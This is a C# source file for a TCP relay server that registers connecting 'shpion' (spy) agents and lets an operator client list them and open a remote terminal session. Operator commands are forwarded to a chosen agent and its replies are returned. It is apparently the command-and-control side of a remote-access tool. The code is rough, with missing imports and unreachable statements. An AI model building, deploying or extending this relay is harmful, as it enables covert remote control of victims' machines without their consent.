using System.Net.Sockets;
using System.Net;
using System;
using System.Text;
using System.IO;

namespace Sre 
{
    class Pro 
    {
        static int index_key = 0;
       static List<ItemListSpion> clients = new List<ItemListSpion>();
        static void Client(object obj) 
        {
            bool check = true;
            TcpClient client = (TcpClient)obj;
            string state_name = Read(client, ref check);

            if (state_name == "0") {
                Write(client, "client", ref check);
                ClientObj(client);
            }
            else if (state_name == "1") 
            {
                Write(client, "shpion", ref check);
                ShpionObj(client);
            }

        }
        static void ClientObj(TcpClient client)
        {
            bool check = true;
            //check online
            while (check)
            {
                string request = "success_check";

                string command = Read(client, ref check);
                Console.WriteLine(command);
                int select_index = 0;
                switch (command)
                {
                    case "check":
                        request = "success_check";
                        break;
                    case "get_client_user":
                        request = "";
                        if (clients.Count > 0)
                        {
                            foreach (var i in clients)
                            {
                                request += i.GetKey().ToString()+",";
                            }
                            request = request.Substring(0, request.Length - 1);
                        }
                        else 
                        {
                            request = "null";
                        }
                        
                        break;
                    case "connect":
                        request = "success_connected";
                        Write(client, "success_connected", ref check);
                        string index = Read(client, ref check);
                        Console.WriteLine(index);
                        //code check
                       
                        foreach (var i in clients) 
                        {
                            if (i.GetKey().ToString() == index) 
                            {
                                index = "found_client";
                                select_index = i.GetKey();
                            }
                        }
                        Write(client, index, ref check);
                        goto jump_code;
                        break;
                    case "connect_terminal":
                        Console.WriteLine("+++++++++++++++++++++++++++++++");
                        Write(client,"success_terminal1",ref check);
                        string arraybuffer = Read(client, ref check);
                        string[] arr = arraybuffer.Split(",");
                        string client_name = arr[0];
                        string login = arr[1];
                        string password = arr[2];
                        Console.WriteLine($"client want connect clientName = {client_name} Login = {login} Password = {password}");
                        Write(client, "success_terminal2", ref check);
                        foreach (var i in clients)
                        {
                            if (i.GetKey().ToString() == client_name)
                            {
                                index = "found_client";
                                select_index = i.GetKey();
                                TcpClient temp_client = i.GetClient();
                                while (check) 
                                {
                                    /*Write(temp_client,Read(client,ref check),ref check);
                                    Read*/
                                    //read cllient
                                    string client_read = Read(client, ref check);
                                    //write temp client
                                    Write(temp_client,client_read,ref check);
                                    //read tempclient
                                    string client_temp_read = Read(temp_client, ref check);
                                    //write client
                                    Write(client, client_temp_read, ref check);
                                    Console.WriteLine("whl1");
                                }
                                //send spion
                            }
                        }

                        goto jump_code;
                        break;
                    default:
                        request = "def";
                        break;
                }
                Console.WriteLine(request + "|");
                Write(client, request, ref check);
            jump_code:
                Console.WriteLine("___________________");
            }
        }
        static void ShpionObj(TcpClient client) 
        {
            bool check=true;
            var my_item = new ItemListSpion(client, index_key);
            clients.Add(my_item);
            index_key++;
            try
            {
                string answer = Read(client,ref check);
                Console.WriteLine(answer);
                while (check)
                {

                }
            }
            catch (Exception e) 
            {
                Console.WriteLine("spion disconnected");
                clients.Remove(my_item);
            }
        }
        static void Write(TcpClient stream, string text,ref bool check) 
        {
            try 
            {
                byte[] buffer = Encoding.UTF8.GetBytes(text);
                stream.GetStream().Write(buffer, 0, buffer.Length);
                stream.GetStream().Flush();
            }catch (Exception ex) 
            {
                check = false;
                UpdateError(new ErrorItem(ErrorState.ErrorStream, ex.Message), stream);
            }
        }
        static string Read(TcpClient stream,ref bool check) 
        {
            string request = "";
            try
            {
                byte[] buffer = new byte[256];
                int size = stream.GetStream().Read(buffer, 0, buffer.Length);
                request = Encoding.UTF8.GetString(buffer, 0, size);
            }
            catch (Exception ex) 
            {
                check = false;
                UpdateError(new ErrorItem(ErrorState.ErrorStream, ex.Message), stream);
            }
            return request;
        }
        static void UpdateError(ErrorItem error, TcpClient client) 
        {
            try
            {
                switch (error.GetErrorState())
                {
                    case ErrorState.ErrorStream:
                        Console.WriteLine("Disconnected");
                        break;
                    case ErrorState.ErrorTcpClientShpionObj:
                        Console.WriteLine("Disconnected");
                        break;
                    case ErrorState.ErrorTcpClientClientObj:
                        Console.WriteLine("Disconnected");
                        break;
                    case ErrorState.ErrorTcpListener:
                        Console.WriteLine("Disconnected");
                        break;
                    case ErrorState.None:
                        Console.WriteLine("Disconnected");
                        break;

                }
            }
            catch { 
            }
            Console.WriteLine($"ErrorState = {error.GetErrorState().ToString()} msg = {error.GetErrorMsg()}");
        }
        static void StartServer() 
        {
            TcpListener server = new TcpListener(IPAddress.Any, 25565);
            server.Start();
            while (true)
            {
                TcpClient client = server.AcceptTcpClient();
                new Thread(Client).Start(client);
                Console.WriteLine("Connected");

            }
        }
        static void Main() 
        {
            Console.WriteLine("Server start");
            StartServer();
        }
    }
}